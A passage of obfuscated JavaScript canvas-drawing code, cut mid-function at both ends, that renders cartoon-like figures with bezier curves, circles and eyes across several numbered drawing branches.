					Δ.bezierCurveTo(ᐃ * 142, 86 * ᐃ, 147 * ᐃ, 93 * ᐃ, 150 * ᐃ, 96 * ᐃ);
					Δ.bezierCurveTo(144 * ᐃ, ᐃ * 107, 113 * ᐃ, ᐃ * 112, 84 * ᐃ, 111 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 52, ᐃ * 112, ᐃ * 34, 106 * ᐃ, ᐃ * 23, ᐃ * 96);
					Δ.closePath();
					ΔⲆ(Δ, undefined, Ⲇᐃ[2], ⵠᐃᐃⲆ * ᐃ);
					Δ.translate(ᐃ * 27, ⲆⲆᐃΔΔ * ᐃ);
					ⵠᐃᐃ(Δ, ᐃ * 35, ᐃ * 75, 15 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⲆΔᐃΔⵠ]);
					ⵠᐃᐃ(Δ, 85 * ᐃ, 75 * ᐃ, 15 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⲆΔᐃΔⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 32, 67 * ᐃ, 5 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠᐃΔΔΔ]);
					ⵠᐃᐃ(Δ, 82 * ᐃ, ᐃ * 67, ᐃ * ⵠⵠΔΔ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠⵠΔ]);
					Δ.translate(ᐃ * -96, ᐃ * -25);
					Δ.scale(1.8, 1.8);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
					Δ.moveTo(ᐃ * 85, 21 * ᐃ);
					Δ.bezierCurveTo(73 * ᐃ, ΔⵠΔᐃᐃ * ᐃ, ᐃ * 70, ᐃⲆⲆΔΔⵠΔ * ᐃ, ᐃ * 70, ᐃ * 26);
					Δ.bezierCurveTo(ᐃ * 72, 34 * ᐃ, ᐃ * 75, 37 * ᐃ, ᐃ * 85, 26 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], ᐃ * ᐃⲆᐃᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
					Δ.moveTo(ᐃ * 89, 21 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 104, ᐃ * ⵠᐃⲆᐃᐃΔⵠ, ᐃ * 105, 19 * ᐃ, 106 * ᐃ, 24 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 105, 36 * ᐃ, 97 * ᐃ, ᐃ * 36, 90 * ᐃ, ᐃ * 28);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠᐃ], Ⲇᐃ[5], 3 * ᐃ);
					ⵠᐃᐃ(Δ, 87 * ᐃ, ᐃ * 23, ᐃ * 6.324555320336759);
					ΔⲆ(Δ, Ⲇᐃ[ⲆⵠᐃΔ], Ⲇᐃ[ⵠᐃΔⵠ], ᐃ * ⵠᐃⵠⲆ)
				} else if (ⲆⵠΔⵠ == ⵠᐃ) {
					Δ.translate(27 * ᐃ, ⵠⵠⵠΔᐃ * ᐃ);
					ⵠᐃᐃ(Δ, ΔⲆᐃᐃΔΔᐃ * ᐃ, 76 * ᐃ, 9.219544457292887 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[3]);
					ⵠᐃᐃ(Δ, 106 * ᐃ, ᐃ * 76, ᐃ * 9.219544457292887);
					ΔⲆ(Δ, Ⲇᐃ[3]);
					Δ.translate(ᐃ * -27, ᐃ * -ⵠⵠⲆⵠΔ);
					Δ.translate(27 * ᐃ, ⲆΔΔᐃᐃ * ᐃ);
					ⵠᐃᐃ(Δ, ᐃ * 35, 75 * ᐃ, ᐃ * ⵠᐃⲆΔᐃᐃⲆ);
					ΔⲆ(Δ, Ⲇᐃ[5]);
					ⵠᐃᐃ(Δ, ᐃ * 85, ᐃ * 75, ᐃ * 15);
					ΔⲆ(Δ, Ⲇᐃ[5]);
					ⵠᐃᐃ(Δ, 32 * ᐃ, ᐃ * 67, ΔⲆΔΔ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠᐃⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 82, ᐃ * 67, ᐃ * 5);
					ΔⲆ(Δ, Ⲇᐃ[6]);
					Δ.translate(ᐃ * -27, -10 * ᐃ);
					Δ.translate(ᐃ * 27, ᐃ * ⲆⵠⵠⲆΔ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
					Δ.moveTo(52 * ᐃ, 86 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 54, 78 * ᐃ, 65 * ᐃ, ᐃ * 80, ᐃ * 67, 85 * ᐃ);
					Δ.bezierCurveTo(69 * ᐃ, ᐃ * 89, ᐃ * 64, 99 * ᐃ, ᐃ * 71, ᐃ * 106);
					Δ.bezierCurveTo(ᐃ * 75, 109 * ᐃ, ᐃ * 61, ᐃ * 108, ᐃ * 58, 102 * ᐃ);
					Δ.bezierCurveTo(53 * ᐃ, ᐃ * 97, 52 * ᐃ, ᐃ * 91, ᐃ * 52, 86 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⵠΔ])
				} else if (ⵠᐃ == 6) {
					Δ.beginPath();
					Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
					Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
					Δ.translate(2 * ᐃ, 0);
					Δ.moveTo(28 * ᐃ, 69 * ᐃ);
					Δ.bezierCurveTo(26 * ᐃ, ᐃ * 39, 31 * ᐃ, ᐃ * 25, ᐃ * 52, ᐃ * 24);
					Δ.bezierCurveTo(86 * ᐃ, 23.5 * ᐃ, 86 * ᐃ, 23.5 * ᐃ, 120 * ᐃ, ᐃ * 23);
					Δ.bezierCurveTo(ᐃ * 137, ᐃ * 23, ᐃ * 145, 33 * ᐃ, ᐃ * 144, ᐃ * 53);
					Δ.bezierCurveTo(ᐃ * 144.5, 63 * ᐃ, ᐃ * 144.5, ᐃ * 63, 145 * ᐃ, ᐃ * 73);
					Δ.bezierCurveTo(141 * ᐃ, ᐃ * 41, ᐃ * 106, ᐃ * 41, ᐃ * 98, ᐃ * 59);
					Δ.bezierCurveTo(ᐃ * 92, ᐃ * 69, ᐃ * 94, ᐃ * 98, 90 * ᐃ, 95 * ᐃ);
					Δ.bezierCurveTo(86 * ᐃ, ᐃ * 95, ᐃ * 86, 95 * ᐃ, ᐃ * 82, ᐃ * 95);
					Δ.bezierCurveTo(79 * ᐃ, 94 * ᐃ, ᐃ * 87, ᐃ * 33, ᐃ * 48, 47 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 31, ᐃ * 57, ᐃ * 30, 65 * ᐃ, ᐃ * 28, 72 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ]);
					Δ.save();
					Δ.translate(87 * ᐃ, ᐃ * 64.5);
					Ⲇᐃᐃ(Δ, -56 * ᐃ, ᐃ * -41.5, ᐃ * 112, 83 * ᐃ, 18 * ᐃ);
					Δ.restore();
					ΔⲆ(Δ, ⲆⵠᐃⲆⲆ, Ⲇᐃ[2], ᐃ * ΔⲆᐃⵠᐃ);
					Δ.translate(27 * ᐃ, ⲆⲆᐃΔΔ * ᐃ);
					ⵠᐃᐃ(Δ, 35 * ᐃ, ᐃ * 75, ᐃ * 15);
					ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ]);
					ⵠᐃᐃ(Δ, 85 * ᐃ, 75 * ᐃ, ᐃ * ⲆⲆⵠⲆᐃᐃⲆ);
					ΔⲆ(Δ, Ⲇᐃ[3]);
					ⵠᐃᐃ(Δ, ᐃ * 32, 67 * ᐃ, ᐃ * ⵠⲆⵠⵠ);
					ΔⲆ(Δ, Ⲇᐃ[Ⲇⵠⵠⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 82, ᐃ * 67, 5 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[4]);
					Δ.scale(1.4, 1.4);
					Δ.translate(ᐃ * -43.5, -32 * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(86 * ᐃ, 105 * ᐃ);
					Δ.bezierCurveTo(89 * ᐃ, ᐃ * 103, ᐃ * 90, 100 * ᐃ, 92 * ᐃ, ᐃ * 97);
					Δ.bezierCurveTo(ᐃ * 93, 91 * ᐃ, 85 * ᐃ, ᐃ * 90, ᐃ * 81, 95 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 80, ᐃ * 97, ᐃ * 83, 101 * ᐃ, ᐃ * 85, ᐃ * 105);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ᐃᐃⲆΔⵠ * ᐃ)
				} else if (7 == ⵠᐃ) {
					Δ.save();
					Δ.translate(86 * ᐃ, ᐃ * 64.5);
					Ⲇᐃᐃ(Δ, ᐃ * -16, -43.5 * ᐃ, 32 * ᐃ, 87 * ᐃ, ᐃ * ⵠⵠΔⵠ);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * 4);
					Δ.translate(0, ᐃ * ⵠᐃᐃΔ);
					Δ.globalAlpha = .5;
					Δ.save();
					Δ.translate(ᐃ * 85.5, ᐃ * 47);
					Ⲇᐃᐃ(Δ, ᐃ * -58.5, ᐃ * -8, ᐃ * 117, ᐃ * ΔⵠΔᐃᐃ, ᐃ * 5);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[0]);
					Δ.translate(ⵠⲆᐃⵠ, -6 * ᐃ);
					Δ.globalAlpha = ᐃᐃⲆΔ;
					Δ.save();
					Δ.translate(ᐃ * 85.5, 47 * ᐃ);
					Ⲇᐃᐃ(Δ, ᐃ * -58.5, -ⲆⲆᐃᐃⲆ * ᐃ, ᐃ * 117, ᐃ * ⵠᐃⵠⵠⲆ, ᐃⲆⵠΔ * ᐃ);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * 4);
					Δ.translate(ⵠⲆᐃⵠ, 7 * ᐃ);
					Δ.globalAlpha = .5;
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(84 * ᐃ, 44 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 85, ᐃ * 26, ᐃ * 96, ᐃ * 23, ᐃ * 103, ᐃ * 30);
					Δ.bezierCurveTo(110 * ᐃ, ᐃ * 36, ᐃ * 110, ᐃ * 47, 92 * ᐃ, 50 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[0]);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ΔⲆΔΔ];
					Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
					Δ.moveTo(87 * ᐃ, ᐃ * 44);
					Δ.bezierCurveTo(ᐃ * 108, 47 * ᐃ, 109 * ᐃ, ᐃ * 54, ᐃ * 102, 63 * ᐃ);
					Δ.bezierCurveTo(92 * ᐃ, 77 * ᐃ, ᐃ * 80, 61 * ᐃ, 84 * ᐃ, 49 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[0]);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(84 * ᐃ, 43 * ᐃ);
					Δ.bezierCurveTo(86 * ᐃ, ᐃ * 24, ᐃ * 72, ᐃ * 23, 68 * ᐃ, ᐃ * 31);
					Δ.bezierCurveTo(56 * ᐃ, 42 * ᐃ, ᐃ * 70, ᐃ * 49, ᐃ * 81, 47 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[0]);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃΔΔΔ];
					Δ.moveTo(ᐃ * 78, ᐃ * 45);
					Δ.bezierCurveTo(ᐃ * 61, ᐃ * 49, 60 * ᐃ, 58 * ᐃ, ᐃ * 68, ᐃ * 64);
					Δ.bezierCurveTo(ᐃ * 78, 75 * ᐃ, 84 * ᐃ, ᐃ * 65, 89 * ᐃ, 54 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
					Δ.translate(0, -ᐃᐃᐃⵠᐃ * ᐃ);
					Δ.globalAlpha = 1;
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃΔΔΔ];
					Δ.moveTo(ᐃ * 84, ᐃ * 44);
					Δ.bezierCurveTo(ᐃ * 85, ᐃ * 26, ᐃ * 96, 23 * ᐃ, 103 * ᐃ, 30 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 110, 36 * ᐃ, ᐃ * 110, ᐃ * 47, 92 * ᐃ, ᐃ * 50);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ⲆⵠᐃΔ * ᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 87, ᐃ * 44);
					Δ.bezierCurveTo(ᐃ * 108, ᐃ * 47, ᐃ * 109, ᐃ * 54, 102 * ᐃ, 63 * ᐃ);
					Δ.bezierCurveTo(92 * ᐃ, 77 * ᐃ, ᐃ * 80, 61 * ᐃ, 84 * ᐃ, ᐃ * 49);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ᐃ * ΔᐃⵠⵠⲆ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 84, ᐃ * 43);
					Δ.bezierCurveTo(ᐃ * 86, ᐃ * 24, 72 * ᐃ, 23 * ᐃ, ᐃ * 68, ᐃ * 31);
					Δ.bezierCurveTo(ᐃ * 56, 42 * ᐃ, ᐃ * 70, ᐃ * 49, ᐃ * 81, ᐃ * 47);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[ⲆᐃᐃΔ], ᐃ * Ⲇᐃⵠᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(78 * ᐃ, ᐃ * 45);
					Δ.bezierCurveTo(61 * ᐃ, ᐃ * 49, ᐃ * 60, 58 * ᐃ, ᐃ * 68, 64 * ᐃ);
					Δ.bezierCurveTo(ᐃ * 78, 75 * ᐃ, 84 * ᐃ, ᐃ * 65, 89 * ᐃ, ᐃ * 54);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⵠᐃΔΔ], ΔⲆⲆⲆ * ᐃ);
					Δ.translate(ⵠⲆᐃⵠ, ᐃ * ⲆΔᐃΔⵠ);
					Δ.globalAlpha = .5;
					Δ.save();
					Δ.translate(85 * ᐃ, ᐃ * 47.5);
					Δ.rotate(0);
					Ⲇᐃᐃ(Δ, -10 * ᐃ, -10.5 * ᐃ, ⵠⵠⵠⲆᐃ * ᐃ, 21 * ᐃ, 5 * ᐃ);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
					Δ.translate(0, -6 * ᐃ);
					Δ.globalAlpha = ΔΔᐃⵠ;
					Δ.save();
					Δ.translate(ᐃ * 85, 47.5 * ᐃ);
					Δ.rotate(Δᐃᐃᐃ);
					Ⲇᐃᐃ(Δ, -ᐃΔᐃΔⲆ * ᐃ, ᐃ * -10.5, 20 * ᐃ, 21 * ᐃ, ᐃ * 5);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃΔ], Ⲇᐃ[4], 4 * ᐃ);
					Δ.translate(ᐃ * 27, ᐃΔⲆᐃⵠ * ᐃ);
					ⵠᐃᐃ(Δ, 35 * ᐃ, ᐃ * 75, ᐃ * ⵠᐃⵠΔⲆⵠⵠ);
					ΔⲆ(Δ, Ⲇᐃ[5]);
					ⵠᐃᐃ(Δ, 85 * ᐃ, 75 * ᐃ, ᐃ * ΔⵠΔᐃⵠ);
					ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 32, ᐃ * 67, ᐃ * ΔⲆΔΔ);
					ΔⲆ(Δ, Ⲇᐃ[ⲆΔᐃΔⵠ]);
					ⵠᐃᐃ(Δ, ᐃ * 82, 67 * ᐃ, ᐃ * 5);
					ΔⲆ(Δ, Ⲇᐃ[6])
				} else if (5 == ⵠᐃ) {
					Ⲇⵠ.width = 211 * ᐃ;
					Ⲇⵠ.height = ᐃ * 152;
					Δ.globalAlpha = .5;
					Δ.translate(Δⵠᐃ, 8 * ᐃ);
					Δ.save();
					Δ.translate(105.5 * ᐃ, ᐃ * 76.5);
					Ⲇᐃᐃ(Δ, -56 * ᐃ, ᐃ * -41.5, ᐃ * 112, 83 * ᐃ, 18 * ᐃ);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[0]);
					Δ.globalAlpha = ⵠΔⲆ;
					Δ.translate(0, -ᐃⵠⵠⵠⲆ * ᐃ);
					Δ.save();
					Δ.translate(ᐃ * 105.5, ᐃ * 76.5);
					Ⲇᐃᐃ(Δ, ᐃ * -56, ᐃ * -41.5, 112 * ᐃ, 83 * ᐃ, 18 * ᐃ);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃ * ⲆⲆⲆΔ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
					Δ.moveTo(68 * ᐃ, ᐃ * 39);
					Δ.bezierCurveTo(ᐃ * 48, ᐃ * 37, ᐃ * 43, ᐃ * 27, ᐃ * 40, ᐃ * 12);
					Δ.bezierCurveTo(ᐃ * 31, ᐃ * 25, ᐃ * 20, ⲆΔⲆᐃΔΔⲆ * ᐃ, ᐃ * 11, ΔΔΔᐃᐃ * ᐃ);
					Δ.bezierCurveTo(ⲆΔⲆΔⵠ * ᐃ, ᐃ * 41, ᐃ * 40, 44 * ᐃ, ᐃ * 62, ᐃ * 45);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ], Ⲇᐃ[ⲆⵠΔΔ], ᐃ * ⲆⲆⲆΔ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[5];
					Δ.moveTo(ᐃ * 143, ᐃ * 38);
					Δ.bezierCurveTo(ᐃ * 161, 40 * ᐃ, 169 * ᐃ, 24 * ᐃ, 171 * ᐃ, ⲆⵠΔᐃⵠ * ᐃ);
					Δ.bezierCurveTo(181 * ᐃ, ᐃ * 23, ᐃ * 188, ᐃ * ⵠⵠⵠⲆᐃ, 199 * ᐃ, ΔΔΔᐃᐃ * ᐃ);
					Δ.bezierCurveTo(204 * ᐃ, 35 * ᐃ, 182 * ᐃ, ᐃ * 44, 152 * ᐃ, ᐃ * 45);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠᐃ], Ⲇᐃ[ⵠⲆⵠⲆ], 4 * ᐃ);
					Δ.save();
					Δ.translate(105.5 * ᐃ, ᐃ * 76.5);
					Ⲇᐃᐃ(Δ, ᐃ * -55, -40.5 * ᐃ, 106 * ᐃ, 77 * ᐃ, ᐃⲆᐃⲆⲆᐃᐃ * ᐃ);
					Δ.restore();
					ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ]);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
					Δ.moveTo(ᐃ * 149, ᐃ * 45);
					Δ.bezierCurveTo(155 * ᐃ, ᐃ * 37, ᐃ * 158, ᐃ * 37, 161 * ᐃ, ᐃ * 52);
					Δ.bezierCurveTo(ᐃ * 164, ᐃ * 60, 161 * ᐃ, ᐃ * 65, ᐃ * 152, ᐃ * 58);
					Δ.bezierCurveTo(145 * ᐃ, ᐃ * 51, ᐃ * 143, 49 * ᐃ, ᐃ * 149, 45 * ᐃ);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[2], ᐃ * ⲆΔⵠᐃ);
					Δ.beginPath();
					Δ.lineCap = ⵠ[5];
					Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
					Δ.moveTo(60 * ᐃ, ᐃ * 43);
					Δ.bezierCurveTo(ᐃ * 67, ᐃ * 47, ᐃ * 67, ᐃ * 51, ᐃ * 57, 59 * ᐃ);
					Δ.bezierCurveTo(50 * ᐃ, ᐃ * 64, 47 * ᐃ, 64 * ᐃ, ᐃ * 49, ᐃ * 55);
					Δ.bezierCurveTo(49 * ᐃ, ᐃ * 42, ᐃ * 51, 38 * ᐃ, 59 * ᐃ, ᐃ * 42);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[2], ᐃ * ⲆⵠᐃⲆ);
					ⵠᐃᐃ(Δ, ᐃ * 105, ᐃ * 107, 10.63014581273465 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠΔ], Ⲇᐃ[6], ᐃ * 4);
					Δ.beginPath();
					Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
					Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
					Δ.moveTo(ᐃ * 105, ᐃ * 100);
					Δ.bezierCurveTo(ᐃ * 111, ᐃ * 101, 113 * ᐃ, 104 * ᐃ, 112 * ᐃ, ᐃ * 109);
					Δ.closePath();
					ΔⲆ(Δ, Ⲇᐃ[7]);
					Δ.translate(44.5 * ᐃ, ᐃ * 22);
					ⵠᐃᐃ(Δ, 35 * ᐃ, 75 * ᐃ, ᐃ * 15);
					ΔⲆ(Δ, Ⲇᐃ[8]);
					ⵠᐃᐃ(Δ, ᐃ * 85, ᐃ * 75, 15 * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ΔⵠⲆᐃⲆ]);
					ⵠᐃᐃ(Δ, ᐃ * 32, 67 * ᐃ, ΔᐃΔⲆ * ᐃ);
					ΔⲆ(Δ, Ⲇᐃ[ΔᐃΔᐃⲆΔΔ]);
					ⵠᐃᐃ(Δ, ᐃ * 82, 67 * ᐃ, ᐃ * 5);
					ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔⲆᐃⲆ])
				} else ⵠᐃ == ᐃΔᐃᐃΔⲆⵠ && (Δ.save(), Δ.translate(ᐃ * 110, ᐃ * 22), Ⲇᐃᐃ(Δ, -ᐃⵠⲆⲆᐃⵠⵠ * ᐃ, -ⲆⲆΔⵠ * ᐃ, ᐃ * 32, 10 * ᐃ, ᐃΔⲆᐃⵠ * ᐃ), Δ.restore(), ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ], Ⲇᐃ[ᐃⲆΔⲆ], ΔΔⵠΔ * ᐃ), Δ.save(), Δ.translate(109.5 * ᐃ, ᐃ * ⵠᐃᐃΔᐃ), Ⲇᐃᐃ(Δ, ᐃ * -18.5, ᐃ * -ΔΔᐃΔ, 37 * ᐃ, ᐃ * 6, ⲆΔΔᐃᐃ * ᐃ), Δ.restore(), ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃⲆ], Ⲇᐃ[4], ᐃ * 3), Δ.globalAlpha = .5, Δ.translate(Δᐃᐃᐃ, ⵠⲆⵠⵠ * ᐃ), Δ.save(), Δ.translate(ᐃ * 86, 40 * ᐃ), Ⲇᐃᐃ(Δ, -58 * ᐃ, -9 * ᐃ, 116 * ᐃ, ᐃ * ⲆⲆΔⲆⵠᐃᐃ, ᐃ * ⲆΔᐃΔⵠ), Δ.restore(), ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]), Δ.globalAlpha = 1, Δ.translate(0, -5 * ᐃ), Δ.save(), Δ.translate(ᐃ * 86, ᐃ * 40), Ⲇᐃᐃ(Δ, -58 * ᐃ, -9 * ᐃ, ᐃ * 116, 18 * ᐃ, 6 * ᐃ), Δ.restore(), ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ⲆⵠᐃΔ], ⵠΔΔΔΔ * ᐃ), Δ.globalAlpha = .75, Δ.translate(0, ᐃ * ᐃΔΔΔ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(109 * ᐃ, 47 * ᐃ), Δ.bezierCurveTo(ᐃ * 110.5, ᐃ * 45, 110.5 * ᐃ, ᐃ * 45, 112 * ᐃ, 43 * ᐃ), Δ.bezierCurveTo(114 * ᐃ, ᐃ * 44, ᐃ * 114, ᐃ * 44, 116 * ᐃ, ᐃ * 45), Δ.bezierCurveTo(ᐃ * 117.5, ᐃ * 43, ᐃ * 117.5, 43 * ᐃ, ᐃ * 119, 41 * ᐃ), Δ.bezierCurveTo(ᐃ * 121, 41.5 * ᐃ, ᐃ * 121, 41.5 * ᐃ, 123 * ᐃ, 42 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[0]), Δ.beginPath(), Δ.translate(ⵠⲆⲆ, ᐃ * 5), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(54 * ᐃ, 35 * ᐃ), Δ.bezierCurveTo(61.5 * ᐃ, 35 * ᐃ, ᐃ * 61.5, 35 * ᐃ, ᐃ * 69, ᐃ * 35), Δ.bezierCurveTo(70 * ᐃ, ᐃ * 48, 70 * ᐃ, ᐃ * 60, ᐃ * 60, ᐃ * 59), Δ.bezierCurveTo(45 * ᐃ, 61 * ᐃ, 44 * ᐃ, ᐃ * 60, ᐃ * 43, ᐃ * 53), Δ.bezierCurveTo(42 * ᐃ, ᐃ * 49, 55 * ᐃ, ᐃ * 51, ᐃ * 55, 44 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]), Δ.globalAlpha = ᐃⲆᐃ, Δ.translate(ΔⲆⲆ, ᐃ * -5), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[5], Δ.moveTo(ᐃ * 105, ᐃ * 38), Δ.bezierCurveTo(110 * ᐃ, ᐃ * 48, ᐃ * 110, 50 * ᐃ, 105 * ᐃ, 53 * ᐃ), Δ.bezierCurveTo(98 * ᐃ, ᐃ * 62, ᐃ * 107, ᐃ * 66, ᐃ * 117, ᐃ * 60), Δ.bezierCurveTo(128 * ᐃ, ᐃ * 56, ᐃ * 130, 56 * ᐃ, ᐃ * 126, ᐃ * 49), Δ.bezierCurveTo(ᐃ * 123.5, 41.5 * ᐃ, ᐃ * 123.5, 41.5 * ᐃ, 121 * ᐃ, ᐃ * 34), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[ⲆⲆᐃᐃⲆ], ᐃ * ΔⲆᐃⲆ), Δ.beginPath(), Δ.lineCap = ⵠ[ⵠⲆⵠⵠ], Δ.lineJoin = ⵠ[ΔⵠⲆⲆ], Δ.moveTo(ᐃ * 109, 47 * ᐃ), Δ.bezierCurveTo(110.5 * ᐃ, ᐃ * 45, 110.5 * ᐃ, 45 * ᐃ, 112 * ᐃ, ᐃ * 43), Δ.bezierCurveTo(114 * ᐃ, 44 * ᐃ, ᐃ * 114, 44 * ᐃ, ᐃ * 116, ᐃ * 45), Δ.bezierCurveTo(117.5 * ᐃ, 43 * ᐃ, 117.5 * ᐃ, 43 * ᐃ, ᐃ * 119, ᐃ * 41), Δ.bezierCurveTo(ᐃ * 121, 41.5 * ᐃ, 121 * ᐃ, ᐃ * 41.5, 123 * ᐃ, 42 * ᐃ), Δ.closePath(), ΔⲆ(Δ, undefined, Ⲇᐃ[ⲆᐃⲆᐃ], ⵠⵠⵠⵠ * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[ⲆⲆΔⵠ], Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ], Δ.moveTo(84 * ᐃ, ᐃ * 33), Δ.bezierCurveTo(ᐃ * 88.5, 34.5 * ᐃ, 88.5 * ᐃ, ᐃ * 34.5, ᐃ * 93, ᐃ * 36), Δ.bezierCurveTo(ᐃ * 87, 43 * ᐃ, 88 * ᐃ, 45 * ᐃ, 91 * ᐃ, ᐃ * 46), Δ.bezierCurveTo(ᐃ * 98, ᐃ * 56, 91 * ᐃ, ᐃ * 57, 85 * ᐃ, 53 * ᐃ), Δ.bezierCurveTo(ᐃ * 80, 50 * ᐃ, 78 * ᐃ, 49 * ᐃ, ᐃ * 82, 43 * ᐃ), Δ.bezierCurveTo(ᐃ * 83.5, 38 * ᐃ, ᐃ * 83.5, ᐃ * 38, ᐃ * 85, 33 * ᐃ), Δ.closePath(), ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⲆ], Ⲇᐃ[ᐃⵠⵠⲆⵠ], ΔΔⵠΔ * ᐃ), Δ.beginPath(), Δ.lineCap = ⵠ[5], Δ.lineJoin = ⵠ[ΔⲆΔΔ], Δ.moveTo(ᐃ * 54, 35 * ᐃ), Δ.bezierCurveTo(ᐃ * 61.5, ᐃ * 35, 61.5 * ᐃ, 35 * ᐃ, ᐃ * 69, ᐃ * 35), Δ.bezierCurveTo(ᐃ * 70, 48 * ᐃ, 70 * ᐃ, ᐃ * 60, 60 * ᐃ, ᐃ * 59), Δ.bezierCurveTo(45 * ᐃ, ᐃ * 61, ᐃ * 44, 60 * ᐃ, ᐃ * 43, ᐃ * 53), 